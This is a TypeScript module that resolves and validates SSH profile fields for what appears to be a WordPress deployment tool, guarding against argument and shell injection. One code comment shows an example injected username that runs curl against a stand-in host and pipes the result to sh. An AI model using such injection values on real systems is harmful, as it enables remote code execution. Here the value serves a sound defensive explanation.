import path from "node:path";
import { normalizeProfile } from "../profiles/normalizeProfile.ts";
import type { Profile, ResolvedProfile } from "../core/model/Profile.ts";

const SAFE_TEMPLATE_VALUE = /^[a-zA-Z0-9._@:/~-]+$/;

export function renderTemplate(template: string, variables: Record<string, unknown>): string {
  if (typeof template !== "string") throw new Error("Profile path templates must be strings.");
  return template.replace(/\{([a-zA-Z][a-zA-Z0-9]*)\}/g, (_, name) => {
    const value = variables[name];
    if (value === undefined) throw new Error(`Unknown profile template variable {${name}}.`);
    if (!SAFE_TEMPLATE_VALUE.test(String(value))) throw new Error(`Unsafe value for profile template variable {${name}}.`);
    return String(value);
  });
}

// `renderTemplate` above only validates the *substituted* portion of a
// `{placeholder}` value — a literal profile field with no placeholder at all
// (e.g. `ssh.username: "-oProxyCommand=curl evil|sh"`) passes through
// `resolve()` completely unchecked. Since these three fields are later
// concatenated straight into ssh/rsync/scp argv elements (`user@host`) or a
// shell-interpreted transport string (`-e "ssh -i <identityFile> ..."`), a
// leading "-" lets them be parsed as an option instead of a value, and most
// shell metacharacters would otherwise reach a shell verbatim. Validate the
// fully-resolved value here — the one place all three fields pass through.
function assertSafeSshField(value: string, label: string): string {
  if (!value || value.startsWith("-") || !SAFE_TEMPLATE_VALUE.test(value)) {
    throw new Error(`Unsafe value for profile field "${label}": ${JSON.stringify(value)}. Only letters, digits, and . _ @ : / ~ - are allowed, and the value must not start with "-".`);
  }
  return value;
}

/**
 * Substitutes `{projectName}` placeholders, resolves `~`, joins remote paths,
 * and validates every field that reaches an ssh/rsync argv. NOT idempotent:
 * `remote.wordpressRoot` becomes an already-joined absolute path here, so
 * resolving twice would join it onto itself. The distinct `ResolvedProfile`
 * return type (rather than a narrowed `Profile`) makes that a compile error.
 */
export function resolveRemoteProfile(rawProfile: Profile, ctx: { projectName: string }): ResolvedProfile {
  if (!rawProfile) throw new Error("Existing WordPress setup requires --profile <name|path>.");
  const profile = normalizeProfile(rawProfile);
  const variables = { projectName: ctx.projectName };
  const resolve = (value: unknown): string => typeof value === "string" ? renderTemplate(value, variables) : (value as string);
  const ssh = {
    host: assertSafeSshField(resolve(profile.ssh.host), "ssh.host"),
    port: Number(profile.ssh.port || 22),
    username: assertSafeSshField(resolve(profile.ssh.username), "ssh.username"),
    identityFile: profile.ssh.identityFile ? assertSafeSshField(resolve(profile.ssh.identityFile).replace(/^~/, process.env.HOME || ""), "ssh.identityFile") : "",
    hostKeyPolicy: profile.ssh.hostKeyPolicy || "strict",
  };
  const projectRoot = resolve(profile.remote.projectRoot);
  const wordpressRoot = path.posix.join(projectRoot, resolve(profile.remote.wordpressRoot));
  return {
    ...profile,
    __resolved: true,
    projectName: ctx.projectName,
    ssh,
    remote: { ...profile.remote, projectRoot, wordpressRoot },
    database: mapStrings(profile.database || {}, resolve) as Profile["database"],
    urls: mapStrings(profile.urls || {}, resolve) as Profile["urls"],
    local: mapStrings(profile.local || {}, resolve),
  };
}

function mapStrings(object: Record<string, unknown>, resolver: (value: unknown) => string): Record<string, unknown> {
  return Object.fromEntries(Object.entries(object).map(([key, value]) => [key, Array.isArray(value) ? value.map(resolver) : resolver(value)]));
}
